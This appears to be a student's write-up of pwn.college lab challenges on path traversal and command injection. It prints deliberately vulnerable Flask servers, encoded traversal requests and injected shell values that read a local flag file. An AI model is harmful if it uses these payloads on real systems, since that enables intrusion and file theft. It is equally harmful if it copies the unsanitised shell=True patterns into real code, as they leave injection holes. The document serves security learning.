#web  

**Path Traversal 1:**

Basic webserver in python:
```python
hacker@web-security~path-traversal-1:~/WebSecurity$ cat /challenge/server
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/files", methods=["GET"])
@app.route("/files/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```



Challenge host a server: /challenge/server. We want to make the server send us the /flag file. If we send a basic request to the server:
```
curl -v http://challenge.localhost/files
```
It responds with a 200 status code, and the index.html file. So we have to go 2 folder layers down to come to root folder, so we try:
```
curl -v http://challenge.localhost/files/../../flag
```
This do not work either. Might be because the server is set to block path traversal.

We try to url encode the path traversal:
```
curl -v http://challenge.localhost/files%2F..%2F..%2Fflag
```
And it gives us the flag. 




**Path Traversal 2:**
```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/shared", methods=["GET"])
@app.route("/shared/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

- The path.strip('/.') prevents the path string to start/end with any / or . character.  
- But we can have /../.. in the middle of the string, so we simply go forward to a folder, then go backwards. Also, we url encode. 

Solution:
```python
import requests

r = requests.get("http://challenge.localhost:80/shared/fortunes%2F..%2F..%2F..%2Fflag")
print(r.text)
```


**CMDi 1:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("directory", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- The argument is not sanitized in any way, so we can set the command to: `;cat /flag`, so the command the system executes is: `ls -l; cat /flag`, which lets us read the flag. 


**CMDi 2:**
```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("root", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/milestone"><input type=text name=root><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- They now remove the ; sign from being used, but we can still use other ways of chaining commands. We send: `| cat /flag` , so the system execute: `ls -l | cat /flag`. This just means cat has access to the output of ls, but we can still use cat normally. 

**CMDi 3:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("location", "/challenge")
    command = f"ls -l '{arg}'"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=location><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Here the argument is supposed to be treated as a string. We can escape the string by starting our argument with a signal quote. And we also have to close it for the command to be valid. So we inject: `';cat /flag`, so the executed command is: `ls -l '';cat/flag''`


**CMDi 4:**
```python
import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/event", methods=["GET"])
def challenge():
    arg = flask.request.args.get("tzid", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form action="/event"><input type=text name=tzid><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Again the argument is not sanitized, but this time the injection is in the parameter argument for the `date` command. We can chain it into a new command, so the command executed is: `TZ=;cat /flag #date`. We do need to add the `#` sign, but it removes the execution of the `date` command all together. 

**CMDi 5:**
```python
@app.route("/assignment", methods=["GET"])
def challenge():
    arg = flask.request.args.get("absolute-path", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/assignment"><input type=text name=absolute-path><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- This time the argument is still not sanitized, but we can not see the output of our injected command. A solution is to write the output of the injection into a file, and then read the file from the terminal: `;cat /flag > /home/hacker/flag`  

**CMDi 6:**
```python
@app.route("/puzzle", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("filedir", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/puzzle"><input type=text name=filedir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
- Hint: how to end lines when running multiple lines in a bash script. 